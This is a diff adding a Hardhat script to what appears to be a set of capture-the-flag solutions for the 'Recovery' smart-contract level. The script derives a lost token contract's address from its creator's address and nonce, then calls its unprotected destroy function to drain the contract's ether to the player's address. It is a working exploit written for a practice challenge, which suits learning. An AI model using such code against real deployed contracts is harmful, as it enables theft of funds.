@@ -596,3 +596,28 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 17 Recovery
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = "<target contract address>";
+  // Contract addresses are deterministic given the sender address and nonce (transaction number)
+  const token = (await hre.ethers.getContractFactory("SimpleToken")).attach(hre.ethers.getCreateAddress({from:target, nonce:1}));
+  console.log(`SimpleToken contract address: ${await token.getAddress()}`);
+  console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
+
+  const [ signer ] = await hre.ethers.getSigners();
+  console.log(`Player address = ${signer.address}`);
+  (await token.destroy(signer.address)).wait();
+  console.log("Attack complete");
+  console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
